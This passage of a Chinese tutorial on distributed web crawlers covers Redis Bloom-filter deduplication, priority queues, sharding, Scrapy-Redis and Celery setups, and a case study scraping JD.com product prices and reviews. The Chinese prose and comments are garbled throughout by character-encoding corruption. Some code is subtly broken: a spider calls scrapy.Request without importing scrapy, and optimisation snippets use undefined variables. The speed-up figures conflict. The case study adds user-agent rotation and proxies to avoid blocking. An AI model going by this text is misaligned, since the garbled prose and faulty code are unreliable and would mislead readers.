<li>æ— æ³•åˆ é™¤å·²æ·»åŠ çš„å…ƒç´ </li>
</ul>
<p><strong>å‚æ•°é…ç½®å»ºè®®ï¼š</strong></p>
<table>
<thead>
<tr>
  <th>æ•°æ®é‡</th>
  <th>ä½æ•°ç»„å¤§å° (bit)</th>
  <th>å“ˆå¸Œå‡½æ•°ä¸ªæ•°</th>
  <th>è¯¯åˆ¤ç‡</th>
  <th>å†…å­˜å ç”¨</th>
</tr>
</thead>
<tbody>
<tr>
  <td>1000 ä¸‡</td>
  <td>2^27 (128M)</td>
  <td>6</td>
  <td>0.1%</td>
  <td>16 MB</td>
</tr>
<tr>
  <td>1 äº¿</td>
  <td>2^30 (1G)</td>
  <td>6</td>
  <td>0.1%</td>
  <td>128 MB</td>
</tr>
<tr>
  <td>10 äº¿</td>
  <td>2^33 (8G)</td>
  <td>7</td>
  <td>0.01%</td>
  <td>1 GB</td>
</tr>
</tbody>
</table>
<p><strong>å®ç°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="language-python"># å®‰è£…ï¼špip install scrapy-redis-bloomfilter
# settings.py
DUPEFILTER_CLASS = 'scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter'

# BloomFilter é…ç½®
BLOOMFILTER_HASH_NUMBER = 6  # å“ˆå¸Œå‡½æ•°ä¸ªæ•°
BLOOMFILTER_BIT = 30         # ä½æ•°ç»„å¤§å° 2^30 (çº¦1G)

# Redis é…ç½®
REDIS_HOST = 'localhost'
REDIS_PORT = 6379
</code></pre>
<p><strong>æ‰‹åŠ¨å®ç° Bloom Filterï¼š</strong></p>
<pre><code class="language-python">import redis
import mmh3  # pip install mmh3

class BloomFilter:
    def __init__(self, host='localhost', port=6379, bit_size=30, hash_count=6):
        self.r = redis.Redis(host=host, port=port)
        self.key = 'crawler:bloomfilter'
        self.bit_size = bit_size
        self.hash_count = hash_count
        self.size = 1 &lt;&lt; bit_size  # 2^bit_size

    def _hash(self, url):
        &quot;&quot;&quot;ç”Ÿæˆå¤šä¸ªå“ˆå¸Œå€¼&quot;&quot;&quot;
        hashes = []
        for i in range(self.hash_count):
            hash_val = mmh3.hash(url, i) % self.size
            hashes.append(hash_val)
        return hashes

    def add(self, url):
        &quot;&quot;&quot;æ·»åŠ  URL&quot;&quot;&quot;
        for hash_val in self._hash(url):
            self.r.setbit(self.key, hash_val, 1)

    def contains(self, url):
        &quot;&quot;&quot;æ£€æŸ¥ URL æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;
        for hash_val in self._hash(url):
            if not self.r.getbit(self.key, hash_val):
                return False
        return True

    def check_and_add(self, url):
        &quot;&quot;&quot;æ£€æŸ¥å¹¶æ·»åŠ &quot;&quot;&quot;
        if self.contains(url):
            return False  # å·²å­˜åœ¨ï¼ˆæˆ–è¯¯åˆ¤ï¼‰
        self.add(url)
        return True  # æ–° URL
</code></pre>
<h4>3. åŸºäº Berkeley DB / LevelDB</h4>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šURL æ•°é‡ç‰¹åˆ«å¤§ï¼Œéœ€è¦æŒä¹…åŒ–å­˜å‚¨ã€‚</p>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>æ”¯æŒç£ç›˜å­˜å‚¨ï¼Œä¸å—å†…å­˜é™åˆ¶</li>
<li>æ”¯æŒé«˜æ•ˆçš„é”®å€¼æŸ¥è¯¢</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>é€Ÿåº¦æ¯” Redis æ…¢</li>
<li>éœ€è¦ç£ç›˜ I/O</li>
</ul>
<h3>ä»»åŠ¡è°ƒåº¦ç­–ç•¥</h3>
<h4>1. ä¼˜å…ˆçº§è°ƒåº¦</h4>
<p>ä½¿ç”¨ Redis ZSetï¼ˆæœ‰åºé›†åˆï¼‰å®ç°ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼š</p>
<pre><code class="language-python">import redis

class PriorityQueue:
    def __init__(self, host='localhost', port=6379):
        self.r = redis.Redis(host=host, port=port)
        self.key = 'crawler:priority_queue'

    def push(self, url, priority=0):
        &quot;&quot;&quot;æ·»åŠ ä»»åŠ¡ï¼Œpriority è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜&quot;&quot;&quot;
        self.r.zadd(self.key, {url: -priority})  # è´Ÿå€¼ä½¿å¾—å¤§ä¼˜å…ˆçº§æ’å‰

    def pop(self):
        &quot;&quot;&quot;å–å‡ºæœ€é«˜ä¼˜å…ˆçº§ä»»åŠ¡&quot;&quot;&quot;
        result = self.r.zpopmin(self.key, 1)
        if result:
            url, score = result[0]
            return url.decode()
        return None

    def size(self):
        &quot;&quot;&quot;é˜Ÿåˆ—å¤§å°&quot;&quot;&quot;
        return self.r.zcard(self.key)
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="language-python">queue = PriorityQueue()

# æ·»åŠ ä¸åŒä¼˜å…ˆçº§çš„ä»»åŠ¡
queue.push('http://example.com/important', priority=10)
queue.push('http://example.com/normal', priority=5)
queue.push('http://example.com/low', priority=1)

# æŒ‰ä¼˜å…ˆçº§å–å‡º
print(queue.pop())  # http://example.com/important
</code></pre>
<h4>2. ä»»åŠ¡åˆ†ç‰‡</h4>
<p>å°† URL æŒ‰å“ˆå¸Œå€¼åˆ†ç‰‡ï¼Œæ¯ä¸ªçˆ¬è™«èŠ‚ç‚¹è´Ÿè´£ç‰¹å®šçš„åˆ†ç‰‡ï¼š</p>
<pre><code class="language-python">import hashlib

class ShardedCrawler:
    def __init__(self, shard_id, total_shards):
        self.shard_id = shard_id
        self.total_shards = total_shards

    def belongs_to_me(self, url):
        &quot;&quot;&quot;åˆ¤æ–­ URL æ˜¯å¦å±äºå½“å‰åˆ†ç‰‡&quot;&quot;&quot;
        url_hash = int(hashlib.md5(url.encode()).hexdigest(), 16)
        shard = url_hash % self.total_shards
        return shard == self.shard_id

    def should_crawl(self, url):
        &quot;&quot;&quot;æ˜¯å¦åº”è¯¥çˆ¬å–æ­¤ URL&quot;&quot;&quot;
        return self.belongs_to_me(url)
</code></pre>
<p><strong>å¯åŠ¨å¤šä¸ªåˆ†ç‰‡ï¼š</strong></p>
<pre><code class="language-bash"># å¯åŠ¨ 4 ä¸ªçˆ¬è™«èŠ‚ç‚¹ï¼Œæ¯ä¸ªè´Ÿè´£ 1/4 çš„ URL
python crawler.py --shard-id 0 --total-shards 4
python crawler.py --shard-id 1 --total-shards 4
python crawler.py --shard-id 2 --total-shards 4
python crawler.py --shard-id 3 --total-shards 4
</code></pre>
<h3>è´Ÿè½½å‡è¡¡</h3>
<h4>åŠ¨æ€è´Ÿè½½è°ƒæ•´</h4>
<pre><code class="language-python">import redis
import time

class LoadBalancer:
    def __init__(self, node_id):
        self.r = redis.Redis()
        self.node_id = node_id
        self.heartbeat_key = f'crawler:heartbeat:{node_id}'
        self.load_key = 'crawler:node_loads'

    def report_heartbeat(self, current_load):
        &quot;&quot;&quot;ä¸ŠæŠ¥å¿ƒè·³å’Œå½“å‰è´Ÿè½½&quot;&quot;&quot;
        self.r.setex(self.heartbeat_key, 30, current_load)
        self.r.zadd(self.load_key, {self.node_id: current_load})

    def get_active_nodes(self):
        &quot;&quot;&quot;è·å–æ´»è·ƒèŠ‚ç‚¹&quot;&quot;&quot;
        nodes = []
        for key in self.r.scan_iter('crawler:heartbeat:*'):
            node_id = key.decode().split(':')[-1]
            load = int(self.r.get(key) or 0)
            nodes.append((node_id, load))
        return nodes

    def get_least_loaded_node(self):
        &quot;&quot;&quot;è·å–è´Ÿè½½æœ€å°çš„èŠ‚ç‚¹&quot;&quot;&quot;
        result = self.r.zrange(self.load_key, 0, 0, withscores=True)
        if result:
            node_id, load = result[0]
            return node_id.decode(), int(load)
        return None, None
</code></pre>
<hr />
<h2>å®æˆ˜ç¤ºä¾‹</h2>
<h3>ç¤ºä¾‹ 1ï¼šScrapy-Redis å®Œæ•´å®ç°</h3>
<p><strong>é¡¹ç›®ç»“æ„ï¼š</strong></p>
<pre><code>distributed_crawler/
â”œâ”€â”€ scrapy.cfg
â”œâ”€â”€ crawler/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â”œâ”€â”€ spiders/
â”‚   â”‚   â”œâ”€â”€ __init__.py
â”‚   â”‚   â””â”€â”€ example_spider.py
â”‚   â”œâ”€â”€ items.py
â”‚   â””â”€â”€ pipelines.py
â””â”€â”€ requirements.txt
</code></pre>
<p><strong>settings.py é…ç½®ï¼š</strong></p>
<pre><code class="language-python"># Scrapy-Redis é…ç½®
SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
DUPEFILTER_CLASS = &quot;scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter&quot;

# BloomFilter é…ç½®
BLOOMFILTER_HASH_NUMBER = 6
BLOOMFILTER_BIT = 30  # æ”¯æŒçº¦ 1 äº¿ URL

# Redis é…ç½®
REDIS_HOST = 'redis.example.com'
REDIS_PORT = 6379
REDIS_PARAMS = {'password': 'yourpassword', 'db': 0}

# æŒä¹…åŒ–é˜Ÿåˆ—
SCHEDULER_PERSIST = True

# Pipeline é…ç½®
ITEM_PIPELINES = {
    'crawler.pipelines.MongoDBPipeline': 300,
}

# MongoDB é…ç½®
MONGODB_URI = 'mongodb://localhost:27017'
MONGODB_DATABASE = 'crawler'

# å¹¶å‘é…ç½®
CONCURRENT_REQUESTS = 32
CONCURRENT_REQUESTS_PER_DOMAIN = 8
DOWNLOAD_DELAY = 0.5

# è‡ªåŠ¨é™é€Ÿ
AUTOTHROTTLE_ENABLED = True
AUTOTHROTTLE_START_DELAY = 1
AUTOTHROTTLE_TARGET_CONCURRENCY = 32
</code></pre>
<p><strong>çˆ¬è™«å®ç°ï¼š</strong></p>
<pre><code class="language-python"># spiders/example_spider.py
from scrapy_redis.spiders import RedisSpider
from crawler.items import NewsItem

class ExampleSpider(RedisSpider):
    name = 'example'
    redis_key = 'example:start_urls'

    custom_settings = {
        'DEPTH_LIMIT': 3,  # æœ€å¤§æ·±åº¦
    }

    def parse(self, response):
        &quot;&quot;&quot;è§£æåˆ—è¡¨é¡µ&quot;&quot;&quot;
        # æå–æ–°é—»é“¾æ¥
        for url in response.css('a.news-link::attr(href)').getall():
            yield response.follow(url, callback=self.parse_detail)

        # æå–ä¸‹ä¸€é¡µ
        next_page = response.css('a.next-page::attr(href)').get()
        if next_page:
            yield response.follow(next_page, callback=self.parse)

    def parse_detail(self, response):
        &quot;&quot;&quot;è§£æè¯¦æƒ…é¡µ&quot;&quot;&quot;
        item = NewsItem()
        item['url'] = response.url
        item['title'] = response.css('h1::text').get()
        item['content'] = response.css('div.content::text').getall()
        item['publish_time'] = response.css('span.time::text').get()
        yield item
</code></pre>
<p><strong>Pipeline å®ç°ï¼š</strong></p>
<pre><code class="language-python"># pipelines.py
import pymongo
from itemadapter import ItemAdapter

class MongoDBPipeline:
    def __init__(self, mongo_uri, mongo_db):
        self.mongo_uri = mongo_uri
        self.mongo_db = mongo_db

    @classmethod
    def from_crawler(cls, crawler):
        return cls(
            mongo_uri=crawler.settings.get('MONGODB_URI'),
            mongo_db=crawler.settings.get('MONGODB_DATABASE')
        )

    def open_spider(self, spider):
        self.client = pymongo.MongoClient(self.mongo_uri)
        self.db = self.client[self.mongo_db]

    def close_spider(self, spider):
        self.client.close()

    def process_item(self, item, spider):
        collection = self.db[spider.name]
        item_dict = ItemAdapter(item).asdict()
        collection.update_one(
            {'url': item_dict['url']},
            {'$set': item_dict},
            upsert=True
        )
        return item
</code></pre>
<p><strong>éƒ¨ç½²å’Œè¿è¡Œï¼š</strong></p>
<pre><code class="language-bash"># åœ¨æœºå™¨ A å¯åŠ¨çˆ¬è™«
scrapy crawl example

# åœ¨æœºå™¨ B å¯åŠ¨çˆ¬è™«
scrapy crawl example

# åœ¨æœºå™¨ C å¯åŠ¨çˆ¬è™«
scrapy crawl example

# æ·»åŠ èµ·å§‹ URLï¼ˆåœ¨ä»»æ„æœºå™¨ï¼‰
redis-cli -h redis.example.com -a yourpassword lpush example:start_urls &quot;http://example.com&quot;
redis-cli -h redis.example.com -a yourpassword lpush example:start_urls &quot;http://example.com/page1&quot;
redis-cli -h redis.example.com -a yourpassword lpush example:start_urls &quot;http://example.com/page2&quot;

# æŸ¥çœ‹é˜Ÿåˆ—çŠ¶æ€
redis-cli -h redis.example.com -a yourpassword llen example:requests
redis-cli -h redis.example.com -a yourpassword scard example:dupefilter
</code></pre>
<h3>ç¤ºä¾‹ 2ï¼šCelery å¼‚æ­¥çˆ¬è™«</h3>
<pre><code class="language-python"># tasks.py
from celery import Celery
import requests
from bs4 import BeautifulSoup

app = Celery('crawler',
             broker='redis://localhost:6379/0',
             backend='redis://localhost:6379/0')

@app.task(bind=True, max_retries=3)
def crawl_url(self, url):
    &quot;&quot;&quot;çˆ¬å–å•ä¸ª URL&quot;&quot;&quot;
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        # æå–æ•°æ®
        data = {
            'url': url,
            'title': soup.find('h1').text if soup.find('h1') else '',
            'links': [a['href'] for a in soup.find_all('a', href=True)]
        }

        # å­˜å‚¨æ•°æ®
        save_to_database(data)

        # æäº¤æ–°çš„çˆ¬å–ä»»åŠ¡
        for link in data['links'][:10]:  # é™åˆ¶æ¯é¡µæœ€å¤šæå– 10 ä¸ªé“¾æ¥
            crawl_url.apply_async(args=[link], countdown=2)

        return data

    except Exception as exc:
        # å¤±è´¥å 60 ç§’é‡è¯•
        raise self.retry(exc=exc, countdown=60)

def save_to_database(data):
    &quot;&quot;&quot;ä¿å­˜æ•°æ®åˆ°æ•°æ®åº“&quot;&quot;&quot;
    # å®ç°æ•°æ®å­˜å‚¨é€»è¾‘
    pass
</code></pre>
<p><strong>è¿è¡Œï¼š</strong></p>
<pre><code class="language-bash"># å¯åŠ¨å¤šä¸ª Worker
celery -A tasks worker --loglevel=info --concurrency=10

# æäº¤ä»»åŠ¡
python -c &quot;from tasks import crawl_url; crawl_url.delay('http://example.com')&quot;

# ç›‘æ§
celery -A tasks flower
# è®¿é—® http://localhost:5555
</code></pre>
<h3>ç¤ºä¾‹ 3ï¼šçœŸå®æ¡ˆä¾‹ - äº¬ä¸œå•†å“ä¿¡æ¯åˆ†å¸ƒå¼çˆ¬è™«</h3>
<p><strong>é¡¹ç›®èƒŒæ™¯</strong>ï¼šæŸæ•°æ®åˆ†æå…¬å¸éœ€è¦é‡‡é›†äº¬ä¸œå¹³å°ä¸Šç‰¹å®šç±»ç›®ï¼ˆå¦‚å›¾ä¹¦ã€ç”µå­äº§å“ï¼‰çš„å•†å“ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»·æ ¼ã€è¯„è®ºã€é”€é‡ç­‰æ•°æ®ï¼Œç”¨äºå¸‚åœºåˆ†æå’Œä»·æ ¼ç›‘æ§ã€‚æ•°æ®è§„æ¨¡ï¼šçº¦ 500 ä¸‡å•†å“ï¼Œ1 äº¿+è¯„è®ºã€‚</p>
<h4>æ¶æ„è®¾è®¡</h4>
<p><strong>ç³»ç»Ÿæ¶æ„</strong>ï¼š</p>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Master èŠ‚ç‚¹  â”‚
â”‚  (Redis)     â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ ä»»åŠ¡é˜Ÿåˆ—  â”‚ â”‚
â”‚ â”‚ å»é‡é›†åˆ  â”‚ â”‚
â”‚ â”‚ BloomFilterâ”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
   â”Œâ”€â”€â”€â”´â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”
   â†“        â†“        â†“        â†“
â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”
â”‚Slave1â”‚  â”‚Slave2â”‚  â”‚Slave3â”‚  â”‚SlaveNâ”‚
â”‚çˆ¬è™«èŠ‚ç‚¹â”‚ â”‚çˆ¬è™«èŠ‚ç‚¹â”‚ â”‚çˆ¬è™«èŠ‚ç‚¹â”‚ â”‚çˆ¬è™«èŠ‚ç‚¹â”‚
â””â”€â”€â”¬â”€â”€â”˜  â””â”€â”€â”¬â”€â”€â”˜  â””â”€â”€â”¬â”€â”€â”˜  â””â”€â”€â”¬â”€â”€â”˜
   â”‚        â”‚        â”‚        â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â†“
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚   MongoDB    â”‚
        â”‚  (æ•°æ®å­˜å‚¨)   â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4>æ€§èƒ½æŒ‡æ ‡</h4>
<p>é€šè¿‡åˆ†å¸ƒå¼æ¶æ„å®ç°äº†æ˜¾è‘—çš„æ€§èƒ½æå‡ï¼š</p>
<ul>
<li><strong>çˆ¬å–é€Ÿåº¦</strong>ï¼šä»å•æœº 1.5 å°æ—¶é™ä½åˆ° 10 åˆ†é’Ÿï¼ˆ9x æå‡ï¼‰</li>
<li><strong>å¹¶å‘å¤„ç†</strong>ï¼š4 ä¸ªçˆ¬è™«èŠ‚ç‚¹ï¼Œæ¯èŠ‚ç‚¹ 16 å¹¶å‘ï¼Œæ€»è®¡ 64 å¹¶å‘è¯·æ±‚</li>
<li><strong>å»é‡æ•ˆç‡</strong>ï¼šä½¿ç”¨ Bloom Filterï¼Œ1 äº¿ URL ä»…å ç”¨ 128 MB å†…å­˜</li>
<li><strong>ç¡¬ä»¶åˆ©ç”¨ç‡</strong>ï¼šè¾¾åˆ° 85%+ çš„ CPU åˆ©ç”¨ç‡</li>
<li><strong>æ€»å¤„ç†é‡</strong>ï¼š40x+ çš„å¤„ç†èƒ½åŠ›æå‡ï¼ˆç›¸æ¯”å•æœºï¼‰</li>
</ul>
<h4>å®ç°ä»£ç </h4>
<p><strong>settings.py é…ç½®</strong>ï¼š</p>
<pre><code class="language-python"># Scrapy-Redis åˆ†å¸ƒå¼é…ç½®
SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
DUPEFILTER_CLASS = &quot;scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter&quot;

# BloomFilter é…ç½®ï¼ˆé€‚é…äº¿çº§æ•°æ®ï¼‰
BLOOMFILTER_HASH_NUMBER = 7
BLOOMFILTER_BIT = 33  # 2^33ï¼Œæ”¯æŒ 10 äº¿+ URL

# Redis ä¸»èŠ‚ç‚¹é…ç½®
REDIS_HOST = '192.168.1.100'
REDIS_PORT = 6379
REDIS_PARAMS = {
    'password': 'your_redis_password',
    'db': 0,
    'socket_keepalive': True,
    'max_connections': 200,
}

# æŒä¹…åŒ–é…ç½®ï¼ˆæ”¯æŒæ–­ç‚¹ç»­çˆ¬ï¼‰
SCHEDULER_PERSIST = True
SCHEDULER_QUEUE_KEY = '%(spider)s:requests'
SCHEDULER_DUPEFILTER_KEY = '%(spider)s:dupefilter'

# Pipeline é…ç½®
ITEM_PIPELINES = {
    'jd_crawler.pipelines.MongoDBPipeline': 300,
    'jd_crawler.pipelines.ImageDownloadPipeline': 400,
}

# MongoDB é…ç½®
MONGODB_URI = 'mongodb://192.168.1.101:27017'
MONGODB_DATABASE = 'jd_products'
MONGODB_COLLECTION = 'products'

# å¹¶å‘å’Œå»¶è¿Ÿé…ç½®
CONCURRENT_REQUESTS = 64            # æ€»å¹¶å‘æ•°
CONCURRENT_REQUESTS_PER_DOMAIN = 16  # å•åŸŸåå¹¶å‘
DOWNLOAD_DELAY = 0.2                # ä¸‹è½½å»¶è¿Ÿ
RANDOMIZE_DOWNLOAD_DELAY = True     # éšæœºåŒ–å»¶è¿Ÿ

# è‡ªåŠ¨é™é€Ÿï¼ˆé˜²æ­¢è¢«å°ï¼‰
AUTOTHROTTLE_ENABLED = True
AUTOTHROTTLE_START_DELAY = 0.5
AUTOTHROTTLE_MAX_DELAY = 3
AUTOTHROTTLE_TARGET_CONCURRENCY = 16.0

# User-Agent è½®æ¢
DOWNLOADER_MIDDLEWARES = {
    'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware': None,
    'jd_crawler.middlewares.RandomUserAgentMiddleware': 400,
    'jd_crawler.middlewares.ProxyMiddleware': 410,
}

# Cookies é…ç½®
COOKIES_ENABLED = True
COOKIES_DEBUG = False
</code></pre>
<p><strong>spiders/jd_spider.py çˆ¬è™«å®ç°</strong>ï¼š</p>
<pre><code class="language-python">from scrapy_redis.spiders import RedisSpider
from jd_crawler.items import ProductItem
import json
import re

class JDSpider(RedisSpider):
    name = 'jd'
    redis_key = 'jd:start_urls'

    # å…è®¸çš„åŸŸå
    allowed_domains = ['jd.com', '3.cn']

    custom_settings = {
        'DEPTH_LIMIT': 5,  # æœ€å¤§çˆ¬å–æ·±åº¦
    }

    def parse(self, response):
        &quot;&quot;&quot;è§£æå•†å“åˆ—è¡¨é¡µ&quot;&quot;&quot;
        # æå–å•†å“é“¾æ¥
        product_links = response.css('div.gl-i-wrap div.p-img a::attr(href)').getall()

        for link in product_links:
            if not link.startswith('http'):
                link = 'https:' + link
            yield scrapy.Request(link, callback=self.parse_product_detail)

        # ç¿»é¡µ
        next_page = response.css('a.pn-next::attr(href)').get()
        if next_page:
            yield response.follow(next_page, callback=self.parse)

    def parse_product_detail(self, response):
        &quot;&quot;&quot;è§£æå•†å“è¯¦æƒ…é¡µ&quot;&quot;&quot;
        item = ProductItem()

        # åŸºæœ¬ä¿¡æ¯
        item['product_id'] = self.extract_product_id(response.url)
        item['url'] = response.url
        item['title'] = response.css('div.sku-name::text').get('').strip()
        item['brand'] = response.css('ul#parameter-brand li a::text').get('')

        # ä»·æ ¼ä¿¡æ¯ï¼ˆéœ€è¦é¢å¤–è¯·æ±‚ï¼‰
        price_url = f'https://p.3.cn/prices/mgets?skuIds=J_{item[&quot;product_id&quot;]}'
        yield scrapy.Request(
            price_url,
            callback=self.parse_price,
            meta={'item': item}
        )

    def parse_price(self, response):
        &quot;&quot;&quot;è§£æä»·æ ¼ä¿¡æ¯&quot;&quot;&quot;
        item = response.meta['item']

        try:
            data = json.loads(response.text)
            if data:
                item['price'] = data[0].get('p', '0')
                item['market_price'] = data[0].get('m', '0')
        except:
            item['price'] = '0'
            item['market_price'] = '0'

        # è¯„è®ºæ•°æ®ï¼ˆéœ€è¦é¢å¤–è¯·æ±‚ï¼‰
        comment_url = f'https://club.jd.com/comment/productPageComments.action?productId={item[&quot;product_id&quot;]}&amp;score=0&amp;sortType=5&amp;page=0&amp;pageSize=10'
        yield scrapy.Request(
            comment_url,
            callback=self.parse_comment,
            meta={'item': item}
        )

    def parse_comment(self, response):
        &quot;&quot;&quot;è§£æè¯„è®ºä¿¡æ¯&quot;&quot;&quot;
        item = response.meta['item']

        try:
            data = json.loads(response.text)
            item['comment_count'] = data.get('productCommentSummary', {}).get('commentCount', 0)
            item['good_rate'] = data.get('productCommentSummary', {}).get('goodRate', 0)
            item['good_count'] = data.get('productCommentSummary', {}).get('goodCount', 0)
        except:
            item['comment_count'] = 0
            item['good_rate'] = 0
            item['good_count'] = 0

        yield item

    def extract_product_id(self, url):
        &quot;&quot;&quot;ä» URL ä¸­æå–å•†å“ ID&quot;&quot;&quot;
        match = re.search(r'/(\d+)\.html', url)
        return match.group(1) if match else ''
</code></pre>
<p><strong>pipelines.py æ•°æ®å¤„ç†</strong>ï¼š</p>
<pre><code class="language-python">import pymongo
from itemadapter import ItemAdapter
from datetime import datetime

class MongoDBPipeline:
    &quot;&quot;&quot;MongoDB å­˜å‚¨ Pipeline&quot;&quot;&quot;

    def __init__(self, mongo_uri, mongo_db, mongo_collection):
        self.mongo_uri = mongo_uri
        self.mongo_db = mongo_db
        self.mongo_collection = mongo_collection
        self.client = None
        self.db = None
        self.collection = None

    @classmethod
    def from_crawler(cls, crawler):
        return cls(
            mongo_uri=crawler.settings.get('MONGODB_URI'),
            mongo_db=crawler.settings.get('MONGODB_DATABASE'),
            mongo_collection=crawler.settings.get('MONGODB_COLLECTION')
        )

    def open_spider(self, spider):
        self.client = pymongo.MongoClient(self.mongo_uri)
        self.db = self.client[self.mongo_db]
        self.collection = self.db[self.mongo_collection]

        # åˆ›å»ºç´¢å¼•
        self.collection.create_index('product_id', unique=True)
        self.collection.create_index('crawl_time')

    def close_spider(self, spider):
        self.client.close()

    def process_item(self, item, spider):
        item_dict = ItemAdapter(item).asdict()
        item_dict['crawl_time'] = datetime.now()

        # ä½¿ç”¨ upsert é¿å…é‡å¤
        self.collection.update_one(
            {'product_id': item_dict['product_id']},
            {'$set': item_dict},
            upsert=True
        )

        spider.logger.info(f'Item saved: {item_dict[&quot;title&quot;]}')
        return item
</code></pre>
<h4>éƒ¨ç½²å’Œè¿è¡Œ</h4>
<p><strong>1. å¯åŠ¨ Redis ä¸»èŠ‚ç‚¹ï¼ˆMasterï¼‰</strong>ï¼š</p>
<pre><code class="language-bash"># åœ¨ Master æœåŠ¡å™¨ä¸Šå¯åŠ¨ Redis
redis-server /etc/redis/redis.conf

# é…ç½® Redis æŒä¹…åŒ–
# åœ¨ redis.conf ä¸­è®¾ç½®ï¼š
# save 900 1
# save 300 10
# save 60 10000
# appendonly yes
</code></pre>
<p><strong>2. å¯åŠ¨çˆ¬è™«èŠ‚ç‚¹ï¼ˆSlaveï¼‰</strong>ï¼š</p>
<pre><code class="language-bash"># åœ¨ Slave 1 æœåŠ¡å™¨ä¸Š
cd /path/to/jd_crawler
scrapy crawl jd

# åœ¨ Slave 2 æœåŠ¡å™¨ä¸Š
cd /path/to/jd_crawler
scrapy crawl jd

# åœ¨ Slave 3 æœåŠ¡å™¨ä¸Š
cd /path/to/jd_crawler
scrapy crawl jd

# åœ¨ Slave 4 æœåŠ¡å™¨ä¸Š
cd /path/to/jd_crawler
scrapy crawl jd
</code></pre>
<p><strong>3. æ·»åŠ èµ·å§‹ URL</strong>ï¼š</p>
<pre><code class="language-bash"># æ‰¹é‡æ·»åŠ å›¾ä¹¦åˆ†ç±»èµ·å§‹ URL
redis-cli -h 192.168.1.100 -a your_redis_password &lt;&lt; EOF
lpush jd:start_urls &quot;https://list.jd.com/list.html?cat=1713,3258,3274&quot;
lpush jd:start_urls &quot;https://list.jd.com/list.html?cat=1713,3258,9435&quot;
lpush jd:start_urls &quot;https://list.jd.com/list.html?cat=1713,3258,9438&quot;
EOF
</code></pre>
<p><strong>4. ç›‘æ§çˆ¬å–çŠ¶æ€</strong>ï¼š</p>
<pre><code class="language-python"># monitor.py - å®æ—¶ç›‘æ§è„šæœ¬
import redis
import time

r = redis.Redis(host='192.168.1.100', password='your_redis_password', decode_responses=True)

while True:
    queue_size = r.llen('jd:requests')
    dupefilter_size = r.scard('jd:dupefilter')

    print(f'[{time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)}]')
    print(f'  å¾…çˆ¬å–é˜Ÿåˆ—: {queue_size:,}')
    print(f'  å·²å»é‡URL: {dupefilter_size:,}')
    print(f'  é¢„è®¡å‰©ä½™æ—¶é—´: {queue_size / (64 * 5) / 60:.1f} åˆ†é’Ÿ')  # å‡è®¾æ¯ç§’ 5 ä¸ªè¯·æ±‚/èŠ‚ç‚¹
    print('-' * 50)

    time.sleep(60)
</code></pre>
<h4>å…³é”®ä¼˜åŒ–ç‚¹</h4>
<p><strong>1. åˆ†å±‚çˆ¬å–ç­–ç•¥</strong>ï¼š</p>
<pre><code class="language-python"># åˆ—è¡¨é¡µä¼˜å…ˆçº§é«˜ï¼Œè¯¦æƒ…é¡µä¼˜å…ˆçº§ä½
class JDSpider(RedisSpider):
    def parse(self, response):
        # åˆ—è¡¨é¡µé“¾æ¥ï¼Œé«˜ä¼˜å…ˆçº§
        for link in product_links:
            yield scrapy.Request(
                link,
                callback=self.parse_product_detail,
                priority=1  # è¯¦æƒ…é¡µä½ä¼˜å…ˆçº§
            )

        # ç¿»é¡µé“¾æ¥ï¼Œæœ€é«˜ä¼˜å…ˆçº§
        if next_page:
            yield response.follow(
                next_page,
                callback=self.parse,
                priority=10  # åˆ—è¡¨é¡µé«˜ä¼˜å…ˆçº§
            )
</code></pre>
<p><strong>2. å¢é‡æ›´æ–°ç­–ç•¥</strong>ï¼š</p>
<pre><code class="language-python">class MongoDBPipeline:
    def process_item(self, item, spider):
        # æ£€æŸ¥æ˜¯å¦éœ€è¦æ›´æ–°
        existing = self.collection.find_one({'product_id': item_dict['product_id']})

        if existing:
            # è®¡ç®—ä»·æ ¼å˜åŒ–
            old_price = float(existing.get('price', 0))
            new_price = float(item_dict.get('price', 0))

            if abs(old_price - new_price) &gt; 0.01:
                # ä»·æ ¼æœ‰å˜åŒ–ï¼Œè®°å½•å†å²
                self.collection.update_one(
                    {'product_id': item_dict['product_id']},
                    {
                        '$set': item_dict,
                        '$push': {
                            'price_history': {
                                'price': new_price,
                                'time': datetime.now()
                            }
                        }
                    }
                )
        else:
            # æ–°å•†å“ï¼Œç›´æ¥æ’å…¥
            self.collection.insert_one(item_dict)
</code></pre>
